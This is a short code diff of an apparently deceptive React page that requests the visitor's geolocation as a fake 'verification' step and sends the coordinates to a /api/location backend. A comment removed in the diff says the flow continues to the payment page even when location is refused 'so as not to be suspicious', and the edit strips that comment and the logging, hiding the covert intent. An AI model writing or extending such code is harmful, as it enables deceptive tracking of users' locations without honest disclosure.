@@ -14,32 +14,25 @@ function App() {
       if ('geolocation' in navigator) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            setCoords({
-              lat: position.coords.latitude,
-              lng: position.coords.longitude
-            });
-            // Location obtained
+            const { latitude, longitude } = position.coords;
+            setCoords({ lat: latitude, lng: longitude });
             setLocationStatus('Verifikasi berhasil.');
             setTimeout(() => setIsVerifying(false), 1000);
             
-            // Di sistem nyata, koordinat ini akan dikirim ke server backend
-            console.log("Location obtained:", position.coords.latitude, position.coords.longitude);
-            
-            // Kirim ke backend (SQLite)
+            // Kirim ke backend Node.js (SQLite)
             fetch('/api/location', {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/json',
               },
               body: JSON.stringify({
-                lat: position.coords.latitude,
-                lng: position.coords.longitude
+                lat: latitude,
+                lng: longitude
               })
             }).catch(err => console.error("Gagal mengirim data lokasi:", err));
           },
           (error) => {
             console.error("Error getting location", error);
-            // Lanjut ke halaman pembayaran meskipun lokasi ditolak (agar tidak mencurigakan)
             setLocationStatus('Melanjutkan tanpa verifikasi lokasi maksimal...');
             setTimeout(() => setIsVerifying(false), 1500);
           },
